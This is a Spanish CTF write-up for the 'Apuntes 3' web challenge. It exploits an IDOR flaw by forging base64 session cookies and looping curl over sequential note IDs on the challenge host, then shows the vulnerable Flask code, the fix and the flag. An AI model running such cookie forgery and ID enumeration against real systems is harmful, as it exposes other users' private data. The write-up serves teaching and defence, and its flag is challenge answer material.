# Apuntes 3

| Campo | Detalle |
|---|---|
| **Categoría** | Web |
| **Puntos** | 100 |
| **Evento** | Kernel CTF — AHAU Team |
| **Autor del reto** | Lychi3 |
| **Objetivo** | `http://3.236.190.110` |
| **Descripción** | *"No se supone que debas ver eso"* |
| **Vulnerabilidad** | IDOR (Insecure Direct Object Reference) en la lectura de notas |
| **CWE** | CWE-639 (Authorization Bypass Through User-Controlled Key) |
| **OWASP** | A01:2021 – Broken Access Control |

## 1. Reconocimiento

Con la cookie de admin de [Apuntes 2](../apuntes-2/README.md), el panel lista **solo las notas propias**:

```html
<p class="muted">Tus notas:</p>
<a href="/admin/note/10">#10 - Nota de h2r6test</a>
```

Datos relevantes:

- Los IDs de nota son **enteros secuenciales**. Cada registro creó una nota nueva: `testuser` = 9, `h2r6test` = 10, `h2r6b` = 11.
- Por lo tanto los IDs 1–8 existían antes y pertenecen a otros usuarios.

## 2. Análisis

Si `/admin/note/<id>` no comprueba que la nota pertenezca al usuario de la sesión, basta con cambiar el número para leer notas ajenas.

## 3. Explotación

### 3.1 Vía `/admin/note/<id>`

```bash
COOKIE="eyJ1c2VyIjogImgycjZ0ZXN0IiwgImFkbWluIjogdHJ1ZSwgInRva2VuIjogIngiLCAibm90ZV9pZCI6IDEwfQ=="
for id in $(seq 1 10); do
  echo "=== note $id ==="
  curl -s -b "session=$COOKIE" "http://3.236.190.110/admin/note/$id" | grep -iE "AHAU|<h2>|<p>"
done
```

```text
=== note 1 ===
    <h2>Credenciales maestras</h2>
    <p style="margin-top: 15px;">No compartir con nadie. Flag: AHAU{just_a_s1mpl3_idor}</p>
=== note 2 ===
    <h2>Reunion viernes</h2>
=== note 3 ===
    <h2>Ideas proyecto</h2>
=== note 4 ===
    <h2>Passwords wifi</h2>
=== note 5 ===
    <h2>Contactos proveedores</h2>
=== note 6 ===
    <h2>TODO deploy</h2>
=== note 7 ===
    <h2>Notas onboarding</h2>
=== note 8 ===
    <h2>Bug tracking</h2>
=== note 9 ===
    <h2>Nota de testuser</h2>
=== note 10 ===
    <h2>Nota de h2r6test</h2>
```

Todas las notas de todos los usuarios son legibles. La **nota 1**, del usuario `superadmin`, contiene la bandera.

### 3.2 Segundo vector: `/dashboard` (sin ser admin)

El dashboard muestra la nota cuyo ID viene en el campo `note_id` **de la cookie**. Cambiándolo, el IDOR funciona incluso con `admin: false`:

```bash
for id in 1 2 3 4 5 10; do
  COOKIE=$(python3 -c "import base64,json; print(base64.b64encode(json.dumps(
  {'user':'h2r6test','admin':False,'token':'x','note_id':$id}).encode()).decode())")
  echo "=== note_id=$id ==="
  curl -s -b "session=$COOKIE" http://3.236.190.110/dashboard | grep -iE "AHAU"
done
```

```text
=== note_id=1 ===
    <p>No compartir con nadie. Flag: AHAU{just_a_s1mpl3_idor}</p>
```

## 4. Causa raíz

```python
notes = {
    1: {"author": "superadmin", "title": "Credenciales maestras",
        "content": "No compartir con nadie. Flag: " + FLAG3},
    ...
}

@app.route("/dashboard")
def dashboard():
    s = decode_session(request.cookies.get("session", ""))
    note = notes.get(s.get("note_id"))          # ID tomado del cliente
    return render_template("dashboard.html", note=note)

@app.route("/admin/note/<int:nid>")
def view_note(nid):
    s = decode_session(request.cookies.get("session", ""))
    if not s.get("admin"):
        return render_template("forbidden.html"), 403
    note = notes.get(nid)                       # no valida note["author"] == s["user"]
    return render_template("note.html", note=note, nid=nid)
```

El código revisa **si** el usuario está autenticado (o si es admin), pero nunca **si el objeto le pertenece**.

## 5. Impacto

Lectura de la información privada de todos los usuarios: credenciales maestras, contraseñas del Wi-Fi corporativo (nota 4), contactos de proveedores y tareas internas de despliegue.

## 6. Remediación

Validar la propiedad del objeto en el servidor y responder 404 en vez de 403, para no confirmar que el recurso existe:

```python
from flask import abort

@app.route("/note/<int:nid>")
@login_required
def view_note(nid):
    note = db.get_note(nid)
    if note is None or note.owner_id != current_user.id:
        abort(404)
    return render_template("note.html", note=note)
```

Además:

- Usar identificadores no predecibles (UUIDv4) para dificultar la enumeración.
- No tomar el `note_id` de la cookie: derivarlo del usuario autenticado en el servidor.

## 🚩 Flag

```text
AHAU{just_a_s1mpl3_idor}
```

---
[⬅ Apuntes 2](../apuntes-2/README.md) · [Índice](../../README.md) · [Apuntes 4 ➡](../apuntes-4/README.md)
